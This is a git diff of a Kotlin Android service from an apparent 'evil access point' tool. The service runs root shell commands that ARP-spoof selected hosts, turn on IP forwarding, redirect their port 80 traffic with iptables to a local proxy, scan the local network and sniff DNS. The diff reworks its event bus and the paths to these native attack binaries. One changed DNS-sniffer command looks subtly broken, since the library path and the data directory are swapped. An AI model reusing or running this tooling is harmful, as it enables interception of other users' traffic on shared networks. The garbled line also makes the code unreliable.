@@ -10,7 +10,6 @@ import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import android.widget.Toast
-import com.nibiru.evilap.proxy.ProxyService
 import eu.chainfire.libsuperuser.Shell
 import io.reactivex.disposables.Disposable
 import java.io.Serializable
@@ -23,6 +22,9 @@ class EvilApService: Service() {
     private val TAG = javaClass.simpleName
     private val NOTIFICATION_ID = 666
     private val NOTIFICATION_CHANNEL_ID = "evilap_notification_channel"
+    private val ARPSPOOF = "/lib/libarpspoof.so"
+    private val SCAN = "/lib/libscanner.so"
+    private val DNSSNIFF = "/lib/libdnssniff.so"
     enum class service(val action: String) {
         ACTION_STOP_SERVICE("com.nibiru.evilap.service_stop"),
         ACTION_SCAN_ACTIVE("com.nibiru.evilap.service_scan_active"),
@@ -31,8 +33,8 @@ class EvilApService: Service() {
         ACTION_DNS_SNIFF("com.nibiru.evilap.service_dns_sniff"),
     }
     private var mDispService: Disposable? = null
-    private var mDispCheckedHosts: Disposable? = null
     private var mCheckedHosts: MutableList<Host> = ArrayList()
+    private var mScannedHosts: MutableList<Host> = ArrayList()
     private var mShells: MutableList<Shell.Interactive> = ArrayList()
     private lateinit var myIp: String
     private lateinit var gateway: String
@@ -60,7 +62,7 @@ class EvilApService: Service() {
 
     private fun setupEventBus(){
         if (mDispService != null && !mDispService!!.isDisposed) return
-        mDispService = RxEventBus.INSTANCE.getObservable().subscribe({
+        mDispService = RxEventBus.INSTANCE.getBackEndObservable().subscribe({
             Log.d(TAG, "got event = $it")
             when (it) {
                 service.ACTION_STOP_SERVICE -> exit()
@@ -82,15 +84,13 @@ class EvilApService: Service() {
                                 "ip6tables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 1337")
                     getIdleShell().addCommand(cmds)
                 }
+                is EventHostChecked -> {
+                    if(it.h.present)
+                        mCheckedHosts.add(it.h)
+                    else
+                        mCheckedHosts.removeAt(mCheckedHosts.indexOfFirst { el: Host -> it.h.mac == el.mac })
+                }
             }
-        })
-        if (mDispCheckedHosts != null && !mDispCheckedHosts!!.isDisposed) return
-        mDispCheckedHosts = RxEventBus.INSTANCE.busCheckedHosts.subscribe({
-            Log.d(TAG, "got event = $it")
-            if(it.present)
-                mCheckedHosts.add(it)
-            else
-                mCheckedHosts.removeAt(mCheckedHosts.indexOfFirst { el: Host -> it.mac == el.mac })
         })
     }
 
@@ -139,9 +139,8 @@ class EvilApService: Service() {
     private fun exit(){
         mWantsToStop = true
         if (mDispService!=null && !mDispService!!.isDisposed) mDispService!!.dispose()
-        if (mDispCheckedHosts!=null && !mDispCheckedHosts!!.isDisposed) mDispCheckedHosts!!.dispose()
         // notify other components
-        RxEventBus.INSTANCE.send(EventExit())
+        RxEventBus.INSTANCE.send2BackEnd(EventExit())
         getIdleShell().addCommand(listOf("pkill -f ${applicationInfo.dataDir}/lib/"))
         nativeArpSpoof(false)
         for (shell in mShells)
@@ -178,30 +177,36 @@ class EvilApService: Service() {
     }
 
     private fun nativeActiveScan(iface: String) {
-        val manager = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
-        myIp = int2ip(manager.dhcpInfo.ipAddress)
-        gateway = int2ip(manager.dhcpInfo.gateway)
-
         val path = applicationInfo.dataDir
-        val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libscanner.so wlan0 active-arp"
-        getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
-                    override fun onCommandResult(commandCode: Int, exitCode: Int) {
-                        Log.i("[native]SCANNER", "$cmd \n(exit code: $exitCode)")
+        getIdleShell().addCommand("ps | grep $path$SCAN", 0)
+        { commandCode, exitCode, output ->
+            if(exitCode==0) {
+                Log.e(TAG, "Scanner already running!")
+                return@addCommand
+            }
+            mScannedHosts.clear()
+            val manager = super.getSystemService(Context.WIFI_SERVICE) as WifiManager
+            myIp = int2ip(manager.dhcpInfo.ipAddress)
+            gateway = int2ip(manager.dhcpInfo.gateway)
+
+            val cmd = "LD_LIBRARY_PATH=$path/lib/ $path$SCAN wlan0 active-arp"
+            getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
+                override fun onCommandResult(commandCode: Int, exitCode: Int) {
+                    Log.i("[native]SCANNER", "$cmd \n(exit code: $exitCode)")
+                    RxEventBus.INSTANCE.send2FrontEnd(EventScannedHosts(mScannedHosts))
+                }
+                override fun onLine(line: String) {
+                    Log.d("[native]SCANNER", line)
+                    if(!line.contains("=>")) return
+                    val elements = line.split("=>")
+                    when(elements[0]){
+                        myIp -> mScannedHosts.add(Host(elements[0],elements[1],"this", true))
+                        gateway -> mScannedHosts.add(Host(elements[0],elements[1],"gateway", true))
+                        else -> mScannedHosts.add(Host(elements[0],elements[1],"host", true))
                     }
-                    override fun onLine(line: String) {
-                        Log.d("[native]SCANNER", line)
-                        if(!line.contains("=>")) return
-                        val elements = line.split("=>")
-                        when(elements[0]){
-                            myIp -> RxEventBus.INSTANCE.busScannedHosts
-                                    .onNext(Host(elements[0],elements[1],"this", true))
-                            gateway -> RxEventBus.INSTANCE.busScannedHosts
-                                    .onNext(Host(elements[0],elements[1],"gateway", true))
-                            else -> RxEventBus.INSTANCE.busScannedHosts
-                                    .onNext(Host(elements[0],elements[1],"host", true))
-                        }
-                    }
-                })
+                }
+            })
+        }
     }
 
     private fun nativeDnsSniff(iface: String) {
@@ -212,7 +217,7 @@ class EvilApService: Service() {
         }
         val shell = getIdleShell()
         val path = applicationInfo.dataDir
-        val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libdnssniff.so $iface"
+        val cmd = "LD_LIBRARY_PATH=$path/lib/$DNSSNIFF $path $iface"
         shell.addCommand(cmd, 0, object : Shell.OnCommandLineListener {
             override fun onCommandResult(commandCode: Int, exitCode: Int) {
                 Log.i("ROOT", "$cmd \n(exit code: $exitCode)")
@@ -221,7 +226,6 @@ class EvilApService: Service() {
                 Log.d("ROOT", line)
             }
         })
-
     }
 
     private fun nativeArpSpoof(spoofing: Boolean){
@@ -245,7 +249,7 @@ class EvilApService: Service() {
                     "sysctl -w net.ipv4.conf.all.send_redirects=0")
             getIdleShell().addCommand(cmds)
             for(host in mCheckedHosts) {
-                val cmd = "LD_LIBRARY_PATH=$path/lib/ $path/lib/libarpspoof.so $gateway ${host.ip}"
+                val cmd = "LD_LIBRARY_PATH=$path/lib/ $path$ARPSPOOF $gateway ${host.ip}"
                 getIdleShell().addCommand(cmd, 0, object : Shell.OnCommandLineListener {
                     override fun onCommandResult(commandCode: Int, exitCode: Int) {
                         Log.i("[native]ARPSPOOF", "$cmd \n(exit code: $exitCode)")
@@ -259,7 +263,7 @@ class EvilApService: Service() {
         else{
             Log.d(TAG, "killing ARPSPOOF")
             val cmds = listOf(
-                    "pkill -f $path/lib/libarpspoof.so",
+                    "pkill -f $path$ARPSPOOF",
                     "iptables -t filter -D FORWARD -i wlan0 -j ACCEPT",
                     "sysctl -w net.ipv4.ip_forward=0",
                     "sysctl -w net.ipv6.conf.all.forwarding=0",
@@ -275,10 +279,14 @@ class EvilApService: Service() {
         return myInetIP.hostAddress
     }
 
-
+    /************************************* COMMUNICATION ******************************************/
     data class Host(val ip: String, val mac: String, var type: String, var present: Boolean): Serializable
+    // Back end events
     class EventExit
     data class EventActiveScan(val type: String)
     data class EventArpSpoof(val state: Boolean)
     data class EventHttpProxy(val state: Boolean)
+    data class EventHostChecked(val h: Host)
+    // Front end events
+    data class EventScannedHosts(val hosts: List<Host>)
 }
